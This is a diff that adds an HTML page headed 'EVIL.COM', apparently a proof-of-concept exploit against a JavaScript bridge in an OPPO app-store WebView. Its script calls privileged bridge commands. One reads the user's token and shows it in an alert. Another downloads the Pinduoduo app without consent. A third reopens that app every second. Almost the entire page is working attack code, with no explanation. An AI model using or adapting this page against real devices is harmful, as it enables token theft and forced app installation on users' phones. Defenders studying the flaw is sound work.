@@ -1,0 +1,89 @@
+
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1,maximum-scale=1.0,user-scalable=no">
+    <title>test</title>
+    <meta name="charset" content="utf-8">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="full-screen" content="yes">
+    <meta name="x5-fullscreen" content="true">
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            padding: 100px;
+            background-color: pink;
+            padding-bottom: 200px;
+        }
+
+        .group {
+            margin-top: 20px;
+        }
+
+        .result {
+            width: 100%;
+            height: 180px;
+            color: #ffffff;
+            left: 0;
+            bottom: 0;
+            padding: 20px;
+            position: fixed;
+            background-color: gray;
+            overflow-y: scroll;
+        }
+
+        #message {
+            word-wrap: break-word;
+        }
+    </style>
+</head>
+
+<body class="page">
+   <h1>EVIL.COM</h1>
+    <div class="result">
+        <p id="message"></p>
+    </div>
+</body>
+<script src="https://cdofs.oppomobile.com/cdo-activity/template/js/libs/libs2.min.js"></script>
+<script src="https://static-common.heytapdownload.com/night_2_0.js"></script>
+<script>
+    if (typeof system !== 'undefined') {
+        window.postCmd = function (cmd, params) {
+            system.postMessage(JSON.stringify({ cmd: cmd, params: params, messageId: Date.now() }));
+        }
+        system.onmessage = function (data) {
+            console.log('测试页1 received:' + data)
+            d = JSON.parse(data);
+            if (d['cmd'] == 'getToken'){
+              alert(d['ret'])
+            }
+            
+        };
+        window.onload=function () {
+            setTimeout(function(){
+            postCmd('getToken');
+            },2000);  
+          setTimeout(function(){
+            $('#message').text('正在下载拼多多');
+            postCmd('nearme_pkg_download', [{ package: 'com.xunmeng.pinduoduo' }]);
+          },2000);
+            setTimeout(function(){
+              $('#message').text('即将打开拼多多');
+                setInterval(function(){
+                postCmd('router_push', [{ uri: 'app:com.xunmeng.pinduoduo' }]);
+                },1000);
+            },10000);
+            
+        }
+    } else {
+        $('#message').html('system.onmessage is not available')
+    }
+</script>
+
+</html>
